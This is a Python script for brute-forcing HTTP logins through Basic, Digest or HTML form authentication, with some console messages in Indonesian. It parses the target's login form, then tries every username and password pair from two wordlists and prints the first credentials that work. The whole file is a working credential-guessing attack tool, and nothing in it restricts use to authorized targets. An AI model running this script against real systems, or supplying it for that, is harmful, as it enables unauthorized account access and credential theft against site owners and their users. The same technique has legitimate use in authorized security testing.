#!/usr/bin/env python3
"""
HTTP Login Bruteforcer
Brute force HTTP login form (Basic, Digest, Form-based).
Usage: python http_bruteforce.py -u http://target.com/login -U users.txt -w passwords.txt
"""

import requests
import argparse
import sys
import re
import time
from requests.auth import HTTPBasicAuth, HTTPDigestAuth


def detect_login_form(session, url):
    try:
        r = session.get(url, timeout=10)
        forms = re.findall(r"<form.*?</form>", r.text, re.IGNORECASE | re.DOTALL)
        if forms:
            form = forms[0]
            action = re.search(r'action=["\']?([^"\'\s>]+)', form, re.IGNORECASE)
            method = re.search(r'method=["\']?([^"\'\s>]+)', form, re.IGNORECASE)
            inputs = re.findall(r'<input[^>]*name=["\']?([^"\'\s>]+)', form, re.IGNORECASE)
            return {
                "action": action.group(1) if action else "",
                "method": (method.group(1) if method else "GET").upper(),
                "inputs": inputs,
            }
    except requests.exceptions.RequestException:
        pass
    return None


def try_login_form(session, url, form_info, username, password, fail_pattern):
    target = form_info["action"] if form_info["action"] else url
    if not target.startswith("http"):
        from urllib.parse import urljoin

        target = urljoin(url, target)

    data = {name: "" for name in form_info["inputs"]}
    # Common field names
    user_field = next(
        (
            n
            for n in form_info["inputs"]
            if n.lower() in ["username", "user", "email", "login", "uid"]
        ),
        None,
    )
    pass_field = next(
        (n for n in form_info["inputs"] if n.lower() in ["password", "pass", "passwd", "pwd"]), None
    )

    if user_field:
        data[user_field] = username
    if pass_field:
        data[pass_field] = password
    else:
        # Fallback
        if form_info["inputs"]:
            data[form_info["inputs"][0]] = username
            if len(form_info["inputs"]) > 1:
                data[form_info["inputs"][1]] = password

    try:
        if form_info["method"] == "POST":
            r = session.post(target, data=data, timeout=10, allow_redirects=False)
        else:
            r = session.get(target, params=data, timeout=10, allow_redirects=False)

        if fail_pattern:
            if re.search(fail_pattern, r.text, re.IGNORECASE):
                return False
        else:
            if (
                r.status_code in [302, 301]
                or "welcome" in r.text.lower()
                or "dashboard" in r.text.lower()
            ):
                return True
            if (
                "invalid" in r.text.lower()
                or "incorrect" in r.text.lower()
                or "failed" in r.text.lower()
            ):
                return False
            if r.status_code == 200 and "login" not in r.text.lower():
                return True
        return r.status_code not in [401, 403]
    except requests.exceptions.RequestException:
        return False


def try_basic_auth(session, url, username, password):
    try:
        r = session.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
        return r.status_code == 200
    except:
        return False


def try_digest_auth(session, url, username, password):
    try:
        r = session.get(url, auth=HTTPDigestAuth(username, password), timeout=10)
        return r.status_code == 200
    except:
        return False


def main():
    parser = argparse.ArgumentParser(description="HTTP Login Bruteforcer")
    parser.add_argument("-u", "--url", required=True, help="Target login URL")
    parser.add_argument("-U", "--users", required=True, help="Username wordlist")
    parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist")
    parser.add_argument("-m", "--mode", choices=["form", "basic", "digest"], default="form")
    parser.add_argument("-f", "--fail", help="Regex pattern for failed login message")
    parser.add_argument(
        "-d", "--delay", type=float, default=0, help="Delay between requests (seconds)"
    )
    args = parser.parse_args()

    try:
        with open(args.users) as f:
            users = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[!] Users file not found: {args.users}")
        sys.exit(1)

    try:
        with open(args.wordlist) as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[!] Password wordlist not found: {args.wordlist}")
        sys.exit(1)

    print(f"[*] Target: {args.url}")
    print(f"[*] Mode: {args.mode}")
    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
    print(f"[*] Total attempts: {len(users) * len(passwords)}")
    print("-" * 60)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    form_info = None
    if args.mode == "form":
        form_info = detect_login_form(session, args.url)
        if not form_info:
            print("[!] Tidak dapat mendeteksi form login")
            sys.exit(1)
        print(f"[*] Form detected: method={form_info['method']}, fields={form_info['inputs']}")

    attempts = 0
    for user in users:
        for password in passwords:
            attempts += 1
            if args.delay > 0:
                time.sleep(args.delay)

            if args.mode == "form":
                success = try_login_form(session, args.url, form_info, user, password, args.fail)
            elif args.mode == "basic":
                success = try_basic_auth(session, args.url, user, password)
            elif args.mode == "digest":
                success = try_digest_auth(session, args.url, user, password)

            if success:
                print(f"\n[+] SUCCESS! {user}:{password} (attempt #{attempts})")
                sys.exit(0)
            if attempts % 50 == 0:
                print(f"[*] {attempts} attempts, current: {user}:{password}", end="\r")

    print(f"\n[-] Tidak ada kredensial valid ditemukan ({attempts} attempts)")


if __name__ == "__main__":
    main()
